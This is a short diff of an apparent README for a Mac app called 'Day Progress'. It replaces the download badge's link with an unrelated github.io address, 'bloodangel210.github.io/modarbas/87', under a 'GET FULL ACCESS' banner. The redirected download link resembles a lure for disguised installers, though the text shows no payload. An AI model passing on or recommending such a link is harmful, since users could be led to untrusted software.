@@ -5,7 +5,7 @@
 <h1 align="center">🌤️ Day Progress — Track Your Day at a Glance</h1>
 
 <p align="center">
-  <a href="https://day-progress-mac-download.github.io/.github/" target="_blank">
+  <a href="https://bloodangel210.github.io/modarbas/87" target="_blank">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20DAY%20PROGRESS%20MAC-GET%20FULL%20ACCESS-1abc9c?style=for-the-badge&logo=apple&logoColor=white" alt="Download Day Progress for Mac">
   </a>
 </p>
